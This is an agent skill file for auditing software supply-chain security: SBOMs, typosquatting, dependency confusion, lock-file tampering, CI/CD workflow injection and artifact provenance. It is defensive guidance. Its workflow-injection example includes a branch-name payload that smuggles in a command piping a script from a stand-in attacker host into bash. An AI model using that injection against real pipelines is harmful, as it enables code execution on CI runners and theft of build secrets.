---
name: supply-chain-security
description: >
  Software supply chain security review skill. Audits SBOM generation and
  completeness, detects typosquatting and dependency confusion attacks, verifies
  lock-file integrity, identifies CI/CD pipeline poisoning vectors, and validates
  artifact provenance. Complements dependency-audit (which checks for CVEs) by
  focusing on the attack vectors used to compromise the supply chain itself.
  Activate when the user asks to "supply chain security", "SBOM audit", "check
  typosquatting", "lock-file integrity", "CI/CD poisoning", "artifact provenance",
  "SLSA compliance", "sigstore verify", "check build pipeline security", or
  "software composition security".
triggers:
  - "supply chain security"
  - "SBOM"
  - "software bill of materials"
  - "typosquatting"
  - "dependency confusion"
  - "lock-file integrity"
  - "CI/CD poisoning"
  - "artifact provenance"
  - "SLSA compliance"
  - "sigstore"
  - "build pipeline security"
  - "package tampering"
  - "pinned dependencies"
version: 1.0.0
author: bug-finder-kit
category: security
risk: safe
tags: "[supply-chain, sbom, provenance, slsa, typosquatting, ci-cd, sigstore]"
date_added: "2026-10-21"
---

# Supply Chain Security — SBOM, Provenance & Pipeline Integrity

> Adversaries increasingly compromise software at the source: by poisoning
> packages, hijacking build pipelines, or injecting malicious code into
> dependencies *before* they reach developers. This skill reviews the full
> supply chain — from package registry to deployed artifact — to surface
> those attack vectors and close them.

> **Scope boundary:** `dependency-audit` handles CVE scanning of known-vulnerable
> versions. This skill handles *how an attacker gets malicious code in* —
> typosquatting, pipeline injection, provenance gaps, and lock-file tampering.

---

## Attack Surface Overview

```
Developer workstation
  └── Package Registry (npm, PyPI, Maven, etc.)
        ├── Typosquatting / Dependency Confusion
        └── Compromised maintainer account
              └── Lock file
                    └── Build Pipeline (CI/CD)
                          ├── Pipeline Injection
                          ├── Secrets in environment
                          └── Build artifact
                                ├── Provenance gap
                                └── Deployed software
```

---

## Phase 1 — SBOM Generation & Completeness

A Software Bill of Materials (SBOM) is the foundation of supply chain security.
Without one, no downstream verification is possible.

### 1.1 Check for Existing SBOM

```bash
# Look for SBOM files in common formats
find . -name "*.spdx" -o -name "*.cdx.json" -o -name "sbom.json" \
       -o -name "*.cyclonedx.json" 2>/dev/null

# Check if SBOM generation is in the CI pipeline
grep -ri "sbom\|cyclonedx\|spdx\|syft\|trivy.*sbom" .github/ .gitlab-ci.yml \
     Jenkinsfile .circleci/ 2>/dev/null
```

### 1.2 Generate SBOM (if missing)

| Ecosystem | Tool | Command |
|---|---|---|
| **Any (container/files)** | Syft | `syft dir:. -o spdx-json > sbom.spdx.json` |
| **Node.js** | CycloneDX | `npx @cyclonedx/cyclonedx-npm --output-format JSON` |
| **Python** | CycloneDX | `cyclonedx-py environment -o cyclonedx.json` |
| **Java/Maven** | CycloneDX plugin | `mvn cyclonedx:makeAggregateBom` |
| **Go** | Syft or gosbom | `syft dir:. --scope all-layers -o spdx-json` |
| **Rust** | cargo-sbom | `cargo sbom > sbom.json` |

### 1.3 SBOM Quality Checks

Review the generated SBOM for completeness:

```
□ All direct dependencies listed with exact versions
□ All transitive dependencies included (full dependency graph)
□ Each component has a PURL (Package URL) identifier
□ License information populated for each component
□ Hash/checksum included for each dependency artifact
□ SBOM itself is signed (e.g., with cosign or GPG)
□ SBOM is generated at build time (not hand-maintained)
□ SBOM is attached to the release artifact (GitHub release, OCI image)
```

**Finding template:**
```
[HIGH] SBOM missing or incomplete
- Location: Project root / CI pipeline
- What: No SBOM file found; supply chain cannot be audited
- Fix: Add Syft or CycloneDX to CI pipeline, attach SBOM to releases
```

---

## Phase 2 — Typosquatting & Dependency Confusion Detection

### 2.1 Typosquatting Risk Assessment

Typosquatting packages mimic popular package names (e.g., `lodahs` vs `lodash`).

**Detection steps:**

```bash
# Extract all direct dependencies
cat package.json | jq '.dependencies, .devDependencies | keys[]' 2>/dev/null
cat requirements.txt | grep -v "^#" | cut -d'=' -f1 | cut -d'>' -f1

# Check for known typosquatting patterns manually or via tool
pip install pip-audit
pip-audit  # flags known malicious packages

# Node.js: use Socket.dev or similar
npx @socket/cli check package.json

# Check package download counts (very low count on a "popular" name = suspicious)
npm info <package-name> | grep "weekly downloads"
```

**High-risk patterns to flag:**

| Pattern | Example | Risk |
|---|---|---|
| Character swap | `lodsash` vs `lodash` | High |
| Missing letter | `recat` vs `react` | High |
| Extra letter | `expresss` vs `express` | High |
| Hyphen/underscore swap | `py_yaml` vs `pyyaml` | Medium |
| Homoglyph | `rеact` (Cyrillic е) vs `react` | Critical |
| Version namespace confusion | `@company/utils` published to public npm | High |

### 2.2 Dependency Confusion Attack

A dependency confusion attack tricks a package manager into fetching an
internal package name from the *public* registry instead of the private one.

**Checks:**

```bash
# Look for private registry scope usage in package.json
cat package.json | jq '.dependencies | to_entries[] | select(.key | startswith("@"))'

# Verify scoped packages resolve to private registry
cat .npmrc | grep "@your-company"
# Should contain: @your-company:registry=https://your-private-registry/

# Check pip.conf / pip.ini for trusted hosts
cat pip.conf | grep "index-url\|extra-index-url"

# Risk: if extra-index-url is set, public PyPI is still searched first
# Attackers can claim the same package name on public PyPI
```

**Remediation:**

```ini
# .npmrc — pin internal scopes to private registry (prevents confusion)
@mycompany:registry=https://registry.mycompany.internal/
always-auth=true

# pip.conf — use --no-index or pin hash to prevent public fallback
[global]
index-url = https://pypi.mycompany.internal/simple/
no-index = true  # prevent fallback to public PyPI
```

**Finding template:**
```
[HIGH] Dependency confusion risk
- Location: .npmrc / pip.conf
- What: Internal package scope not pinned to private registry
- Why: Attacker can publish same package name to public registry and
       intercept builds if public registry is searched as fallback
- Fix: Pin internal scopes explicitly; disable public registry fallback
```

---

## Phase 3 — Lock-File Integrity

### 3.1 Lock File Presence & Commitment

```bash
# Verify lock files exist and are committed
git ls-files package-lock.json yarn.lock pnpm-lock.yaml \
             Pipfile.lock poetry.lock go.sum cargo.lock Gemfile.lock
```

```
□ Lock file committed to version control (not in .gitignore)
□ Lock file matches current manifest (no unrecorded installs)
□ Lock file reviewed in PRs as carefully as source code
□ CI installs from lock file (npm ci, not npm install)
□ No manual edits to lock file (should only be tool-generated)
```

### 3.2 Lock File Tampering Detection

```bash
# Verify lock file consistency
npm ci --dry-run          # fails if lock file is out of sync
pip-sync requirements.txt # verifies environment matches lock

# Detect unexpected changes in lock file via git diff
git diff HEAD~1 package-lock.json | grep "^+" | grep '"resolved"'
# Review any new resolved URLs — should only point to expected registry

# Check for suspicious resolved URLs in lock file
grep -E '"resolved":\s*"https?://(?!registry\.npmjs\.org|registry\.yarnpkg\.com)' \
     package-lock.json
```

**Suspicious lock-file signals:**
- `resolved` URL pointing to non-official registry
- `integrity` hash changed without version bump
- New `dependencies` block inserted for packages not in `package.json`
- `version` downgraded (can re-introduce patched vulnerability)

### 3.3 Hash Pinning

```bash
# Python: generate hashes for requirements
pip-compile --generate-hashes requirements.in > requirements.txt
# Result: each package pinned with --hash=sha256:...

# Verify installed packages match hashes
pip install --require-hashes -r requirements.txt

# Node: lock file already contains integrity hashes
# Verify them manually
npm audit signatures   # verifies npm registry signatures (npm >=9)
```

---

## Phase 4 — CI/CD Pipeline Poisoning

CI/CD pipelines are prime targets: compromise the pipeline, compromise every
build output.

### 4.1 GitHub Actions Security

```bash
# Audit third-party actions — should be pinned to full SHA, not mutable tag
grep -r "uses:" .github/workflows/ | grep -v "@[0-9a-f]\{40\}"
```

**Bad vs. Good:**
```yaml
# BAD — tag can be moved to point to malicious code
- uses: actions/checkout@v4

# GOOD — full commit SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

```
□ All third-party actions pinned to full commit SHA
□ Internal/reusable workflows require PR review before use
□ GITHUB_TOKEN permissions minimized (contents: read only unless needed)
□ Secrets not printed in logs (no echo "$SECRET", no set -x with secrets)
□ Pull-request-triggered workflows cannot access secrets (use pull_request not pull_request_target)
□ Self-hosted runners isolated (ephemeral containers, not persistent VMs)
□ Workflow files reviewed as code (attackers target workflow injection via PR titles/branch names)
```

### 4.2 Workflow Injection Detection

```bash
# Scan for untrusted input used in run steps (injection via github.event.*)
grep -rn "github\.event\.pull_request\.\|github\.event\.issue\.\|github\.event\.comment\." \
     .github/workflows/ | grep -i "run:"

# Flag dangerous patterns
grep -n '\${{ github.event.pull_request.title }}' .github/workflows/*.yml
grep -n '\${{ github.head_ref }}' .github/workflows/*.yml
```

**Vulnerable pattern:**
```yaml
# VULNERABLE — attacker-controlled branch name injected into shell
- run: echo "Branch: ${{ github.head_ref }}"
# Attacker names branch: "; curl attacker.com/exfil.sh | bash #"
```

**Safe pattern:**
```yaml
# SAFE — assign to env var first; shell treats it as data, not code
env:
  HEAD_REF: ${{ github.head_ref }}
- run: echo "Branch: $HEAD_REF"
```

### 4.3 Secrets & Environment Security

```bash
# Check for secrets hardcoded in workflow files
grep -rni "password\|secret\|api_key\|token\|private_key" .github/workflows/ \
  | grep -v "secrets\." | grep -v "#"

# Verify secret masking — look for secrets passed as env vars correctly
grep -rn "env:" .github/workflows/ -A5 | grep "secrets\."
```

```
□ All secrets via repository/organization secrets (not hardcoded)
□ Secrets scoped to minimum required environments
□ Old/rotated secrets deleted from settings
□ No secret values in workflow run logs (use ::add-mask:: if needed)
□ Third-party integrations use fine-grained tokens, not full PATs
```

### 4.4 Build Artifact Integrity

```bash
# Check if build artifacts are hashed and the hash is published
ls dist/*.sha256 dist/*.sha512 2>/dev/null  # manual hashes

# Check for SLSA provenance generation
grep -r "slsa-github-generator\|slsa-verifier\|cosign\|sigstore" .github/workflows/
```

---

## Phase 5 — Artifact Provenance (SLSA / Sigstore)

Provenance answers: *Who built this artifact, from what source, and how?*

### 5.1 SLSA Compliance Check

[SLSA (Supply-chain Levels for Software Artifacts)](https://slsa.dev) defines
four levels of supply chain integrity:

| Level | Requirement |
|---|---|
| SLSA 1 | Build process documented; provenance generated |
| SLSA 2 | Versioned build scripts; signed provenance |
| SLSA 3 | Build runs in isolated, auditable environment |
| SLSA 4 | Hermetic builds; two-party review; reproducible |

```
□ SLSA level explicitly defined for project
□ Provenance generated by CI (using slsa-github-generator or equivalent)
□ Provenance attached to GitHub release or OCI image
□ Consumers verify provenance before deploying (slsa-verifier)
```

**GitHub Actions SLSA 3 provenance (example):**
```yaml
jobs:
  build:
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
    steps:
      - uses: actions/checkout@<SHA>
      - run: make build
      - id: hash
        run: |
          sha256sum artifact.tar.gz | base64 -w0
          echo "hashes=$(sha256sum artifact.tar.gz | base64 -w0)" >> $GITHUB_OUTPUT

  provenance:
    needs: [build]
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
```

### 5.2 Sigstore / Cosign for Container Images

```bash
# Sign a container image
cosign sign --key cosign.key ghcr.io/org/app:v1.0.0

# Verify before deploying
cosign verify --key cosign.pub ghcr.io/org/app:v1.0.0

# Keyless signing (uses Sigstore transparency log)
cosign sign ghcr.io/org/app:v1.0.0  # uses OIDC identity from CI

# Verify keyless
cosign verify --certificate-identity=https://github.com/org/repo/.github/workflows/release.yml@refs/heads/main \
              --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
              ghcr.io/org/app:v1.0.0
```

### 5.3 npm Package Provenance

```bash
# Verify npm package provenance (npm >=9.5)
npm audit signatures
npm info <package> dist.integrity
npm info <package> dist.tarball

# Provenance link for published packages
npm publish --provenance  # links package to GitHub Actions build
```

---

## Phase 6 — Findings & Remediation Summary

### Severity Guide

| Severity | Example |
|---|---|
| **Critical** | CI/CD workflow injection allowing RCE; compromised dependency with active exfiltration |
| **High** | Unpinned third-party CI actions; missing lock file; internal package not scoped to private registry |
| **Medium** | SBOM missing or incomplete; no artifact signing; SLSA level 0 |
| **Low** | Lock file not reviewed in PRs; secrets have excess scope |
| **Info** | SLSA level below target; provenance not attached to releases |

### Finding Format

```
### [Severity] Title
- Location: file path, workflow file, registry
- What: one sentence describing the supply chain risk
- Attack scenario: how an attacker exploits this gap
- Evidence: the specific code/config showing the risk
- Fix: concrete remediation with before/after snippet
- SLSA impact: which SLSA level this blocks
```

### Quick Wins (Highest ROI)

1. **Pin all GitHub Actions to full SHA** — prevents tag-redirect attacks
2. **Run `npm ci` / `pip install --require-hashes`** — enforces lock-file integrity
3. **Pin internal scopes to private registry in `.npmrc`** — prevents dependency confusion
4. **Generate and publish SBOM in CI** — enables downstream auditing
5. **Enable `npm audit signatures`** — verifies registry signing keys

---

## References

| Resource | URL |
|---|---|
| SLSA Framework | https://slsa.dev |
| Sigstore / Cosign | https://www.sigstore.dev |
| OpenSSF Scorecard | https://securityscorecards.dev |
| OWASP Top 10 CI/CD Security Risks | https://owasp.org/www-project-top-10-ci-cd-security-risks/ |
| CISA SBOM Guidance | https://www.cisa.gov/sbom |
| Socket.dev (typosquatting detection) | https://socket.dev |
| npm provenance docs | https://docs.npmjs.com/generating-provenance-statements |
| Syft SBOM generator | https://github.com/anchore/syft |
